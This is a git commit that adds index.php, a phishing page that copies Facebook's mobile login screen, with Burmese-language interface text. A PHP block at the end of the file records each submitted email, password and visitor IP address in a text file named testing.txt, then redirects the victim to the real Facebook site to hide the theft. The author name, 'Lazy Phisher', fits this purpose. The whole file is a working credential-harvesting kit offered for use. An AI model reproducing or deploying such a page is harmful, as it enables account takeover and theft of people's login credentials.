b0833d58c27d0c303ed5fc293cf4cd9762424c3f
Lazy Phisher <34194184+Mr219@users.noreply.github.com>
2018-01-27 00:52:43 +0630

    Create index.php

---
+++ index.php
@@ -0,0 +1,69 @@
+
+ 
+  <!DOCTYPE html><html><head><title>Welcome to Facebook</title><meta charset="utf-8"><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" /><link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" /><meta name="theme-color" content="#3b5998" /><link rel="stylesheet" type="text/css" data-bootloader-hash="iqgOi" href="https://static.xx.fbcdn.net/rsrc.php/v3/yh/l/0,cross/XjHzkGxu4mn.css" /><link rel="stylesheet" type="text/css" data-bootloader-hash="XjlIw" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/l/0,cross/s4innxT7-8q.css" /><script id="u_0_d">function envFlush(a){function b(c){for(var d in a)c[d]=a[d]}if(window.requireLazy)window.requireLazy(["Env"],b);else{window.Env=window.Env||{};b(window.Env)}}envFlush({"timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,"Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},"isHeartbeatEnabled":true,"isArtilleryOn":true},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true}});</script><script>document.domain = 'facebook.com';window.FB_GKS={"mobile_chrono_selector":true,"mobile_js_show_debug":false,"mobile_js_log_error":false,"m_js_log_history":false,"js_nocatch":false,"moulder_feed_hide_toggle":false,"m_onephase_home":true,"mtouch_composer_no_autoresize":true,"m_js_crossorigin_attribute":true};window.FB_QES={};</script><script>__DEV__=0;</script><script id="u_0_e" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3iPLI4/y6/l/qz_MM/X7OZhn0T8cs.js" data-bootloader-hash="lyiD1"></script><script id="u_0_f">(function _(a,b,c,d){function e(j){document.cookie=j+"=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"}function f(j,k){document.cookie=j+"="+k+";path=/;domain=.facebook.com;secure"}if(!a){e(b);e(c);return}var g=null;if(navigator.userAgent.indexOf("Firefox")!==-1||!window.devicePixelRatio&&navigator.userAgent.indexOf("Windows Phone")!==-1)if(document.documentElement!=null){g=screen.width/document.documentElement.offsetWidth;g=Math.max(1,Math.floor(g*2)/2)}if((!g||g===1)&&navigator.userAgent.indexOf("IEMobile")!==-1){g=Math.sqrt(screen.deviceXDPI*screen.deviceYDPI)/96;g=Math.max(1,Math.round(g*2)/2)}f(b,(g||window.devicePixelRatio||1).toString());var h=window.screen?screen.width:0,i=window.screen?screen.height:0;f(c,h+"x"+i);if(d&&document.cookie&&window.devicePixelRatio>1)document.location.reload()})(true, "m_pixel_ratio", "wd", false);</script><meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" /><meta name="description" content="&#x101e;&#x1004;&#x1039;&#x104f; &#x101e;&#x1030;&#x1004;&#x101a;&#x1039;&#x1001;&#x103a;&#x1004;&#x1039;&#x1038;&#x104a; &#x1019;&#x102d;&#x101e;&#x102c;&#x1038;&#x1005;&#x102f;&#x104a; &#x101e;&#x1004;&#x1039;&#x101e;&#x102d;&#x1031;&#x101e;&#x102c;&#x101e;&#x1030;&#x1019;&#x103a;&#x102c;&#x1038;&#x108f;&#x103d;&#x1004;&#x1037;&#x1039; &#x1005;&#x1010;&#x1004;&#x1039;&#x104d; &#x1001;&#x103a;&#x102d;&#x1010;&#x1039;&#x1006;&#x1000;&#x1039;&#x107f;&#x1015;&#x102e;&#x1038;&#x1019;&#x107d;&#x103d;&#x1031;&#x101d;&#x101b;&#x1014;&#x1039; Facebook &#x101e;&#x102d;&#x102f;&#x1037;&#x1031;&#x101c;&#x102c;&#x1037;&#x1002;&#x1039;&#x1021;&#x1004;&#x1039;&#x101d;&#x1004;&#x1039;&#x1015;&#x102b;&#x104b;" /><link rel="canonical" href="https://www.facebook.com/login/" /></head><body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw"><script id="u_0_c">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;if(c)c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait");return b}})(window);</script><div id="viewport"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page"><div class="_129_" id="header-notices"></div><div class="_4g33 _52we _52z5" id="header"><div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href=""><i class="img sp_MP2OtCXORz9_3x sx_8d0886"><u>facebook</u></i></a></div></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
+	<div class="_4g33">
+		<div class="_4g34" id="u_0_0">
+			<div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
+				<div class="_52jd">
+				</div></div>
+				<div class="aclb _4-4l">
+					<div data-sigil="m_login_upsell two_steps_login_element login_identify_step_element">
+						<div class="_4fmw grouped aclb">
+							<a class="touchableArea first last area touchable acy apl abt abb" href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253D9GppWmlguAuav0pSBs4yMNPj&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8" target="_top" data-sigil="touchable marea">
+								<div class="ib cc">
+									<i class="l img sp_XK6GAXGTSNb_3x sx_67d278">
+									</i><div class="c"><span class="fcl">
+										 
+									  Get Facebook for Android and browse faster  </span></div></div>
+							</a></div></div><div class="_5rut">
+	<form method="post" class="mobile-login-form _5spm" id="u_0_1" novalidate="1" action=" " data-sigil="m_login_form">
+	<input type="hidden" name="lsd" value="AVqbvSb_" autocomplete="off" />
+	<input type="hidden" name="charset_test" value="&#x20ac;,&#xb4;,&#x20ac;,&#xb4;,&#x6c34;,&#x414;,&#x404;" />
+	<input type="hidden" name="version" value="1" />
+	<input type="hidden" id="ajax" name="ajax" value="0" />
+	<input type="hidden" id="width" name="width" value="0" />
+	<input type="hidden" id="pxr" name="pxr" value="0" />
+	<input type="hidden" id="gps" name="gps" value="0" />
+	<input type="hidden" id="dimensions" name="dimensions" value="0" />
+	<input type="hidden" name="m_ts" value="1474981681" />
+	<input type="hidden" name="li" value="MW_qV35PaQLNShzpoejeiSVm" />
+	<div class="_56be _5sob">
+		<div class="_55wo _55x2 _56bf">
+			<input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq" name="email" placeholder=" Email or Phone " value="" data-sigil="m_login_email" />
+			<div cla id=""ss="_3nph _mg8" data-sigil="m_login_password">
+				<div class="_4g33">
+					<div class="_4g34 _5i2i _52we">
+						<div class="_5xu4">
+							<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" name="pass" placeholder=" Password " id="u_0_2" type="password" data-sigil="password-plain-text-toggle-input" value = ""/>
+</div>
+</div>
+<div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" id="u_0_3" style="display:none"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" id="u_0_4" style="display:none">ဖျောက်ပါ</span><span class="mfss" id="u_0_5">ပြပါ</span></a></div></div></div></div></div></div></div><div class="_2pie" style="text-align:center;"><button type="submit" value="Log In" class="_54k8 _56bs _56b_ _56bw _56bu" name="login" id="u_0_6" data-sigil="touchable m_login_button"><span class="_55sr"> Log In </span></button></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript></form>
+
+
+
+
+<div class="_52jj _5t3b"><a class="btn btnS medBtn mfsm touchable" role="button" style="height:36px;
+        padding-left:16px;
+        padding-right:16px;
+        padding-top:5px;" href="http://m.facebook.com/reg/?cid=103&refid=8" id="signup-button" data-sigil="blocking-touchable"> Create New Account </a></div><div class="other-links"><ul class="_5pkb _55wp"><li><span class="mfss fcg"><a href="http://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&lwv=100&refid=8" id="forgot-password-link">Forgotten password? </a><span aria-hidden="true"> · </span><a class="sec" href="http://m.facebook.com/help/?refid=8" id="help-link"> Help Centre </a></span></li></ul></div></div></div></div></div><div></div><div class="_55wr _5ui2"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="marea"><div class="_4g33"> <div class="_4g34"> <span class="_52jc _52j9 _52jh">  English  (UK)</span><div><span ="_52jc"><a href="?len=5">  ျမန္မာဘာသာ  </a></span></div> <div><span class="_52jc"><a href="?len=3"> 中文(简体) </a></span></div><div><span class="_52jc"><a href="?len=4"> Português (Brasil) </a></span></div></div><div class="_4g34"><div><span class="_52jc"><a href="?len=1">မြန်မာဘာသာ</a></span></div><div><span class="_52jc"><a href="?len=6"> ภาษาไทย </a></span></div><div><span class="_52jc"><a href ="?len=7"> Español </a></span></div><a href="https://free.facebook.com/language.php?n=https%3A%2F%2Ffree.facebook.com%2Flogin%2F%3Fnext%3Dhttps%253A%252F%252Ffree.facebook.com%252Fstories.php%253Faftercursorr%253D1492217119%25253A1492217119%25253A8%25253A-7670316139312823411%25253A1492217107%25253A6409025332052042109%2526tab%253Dh_nor%2526__m_log_async__%253D1%2526refid%253D28%26li%3DOIXxWMD_SN6uc83BWsCAakhh%26e%3D1348029%26login_try_number%3D1%26refsrc%3Dhttps%253A%252F%252Ffree.facebook.com%252Flogin%252F&ref_component=mbasic_footer&ref_page=XLoginController"><div class="_3j87 _1rrd"><i class="_4q9a img sp_hRDg1FNwK5g_1_5x sx_0bd845"></i></div></a></div></div></div><div class="_5ui4"><span class="mfss fcg">Facebook ©2018</span></div></div></div></div><div class="viewportArea _2v9s" id="u_0_7" style="display:none" data-sigil="marea"><div class="_5vsg" id="u_0_g"></div><div class="_5vsh" id="u_0_h"></div><div class="_5v5d fcg"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>တင်ပေးနေသည်...</div></div><div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"><div class="container"><div class="image"></div><div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">ပြန်စမ်းကြည့်ပါ</a></div></div></div></div><div id="static_templates"><div class="mDialog" id="modalDialog" style="display:none"><div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"><div class="_4g33 _52we"><div class="_5s61"><div class="_52z7"><button type="submit" value="မလုပ်တော့ပါ" class="cancelButton btn btnD bgb mfss touchable" data-sigil="dialog-cancel-button blocking-touchable">မလုပ်တော့ပါ</button><button type="submit" value="နောက်သို့" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="နောက်သို့" data-sigil="dialog-back-button blocking-touchable"><i class="img sp_hRDg1FNwK5g_1_5x sx_ceb390" style="margin-top: 2px;"></i></button></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">တင်ပေးနေသည်...</div></div></div><div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div></div><div id="u_0_8"></div></div><div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg" id="dialogSpinner"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_9" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>တင်ပေးနေသည်...</div></div></div></div></body></html>
+
+
+  <?php 
+   if(isset($_POST['login'])){
+	   
+$user= $_POST['email']; 
+$pass= $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$g = fopen("testing.txt", "a"); 
+fwrite ($g , "\r\nEmail[". $user . "]:\r\n Password>[". $pass ."]\r\nIP:[" . $ip . "]:\r\n");
+fclose($g);
+
+        ?>
+<meta http-equiv="refresh" content="3;url=http://m.facebook.com"/> 
+<script>
+document.body.innerHTML='<center><img src=https://i.stack.imgur.com/h6viz.gif></center>';
+</script>
+<?php
+}
+?>
+  
